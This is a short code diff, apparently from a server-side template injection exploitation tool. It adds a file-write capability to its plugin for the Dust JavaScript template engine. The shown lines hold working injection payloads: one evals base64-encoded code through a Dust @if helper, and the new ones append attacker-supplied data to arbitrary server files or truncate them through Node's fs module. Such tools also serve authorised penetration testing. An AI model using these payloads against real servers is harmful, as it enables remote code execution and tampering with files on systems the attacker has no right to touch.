@@ -16,6 +16,11 @@ class Dust(javascript.Javascript):
                 'call': 'inject',
                 'evaluate': """{@if cond=\"eval(Buffer('%(code_b64)s', 'base64').toString())\"}{/if}"""
             },
+            'write' : {
+                'call' : 'evaluate',
+                'write' : """require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
+                'truncate' : """require('fs').writeFileSync('%(path)s', '')"""
+            },
             # Not using execute here since it's rendered and requires set headers and trailers
             'execute_blind' : {
                 'call': 'evaluate',
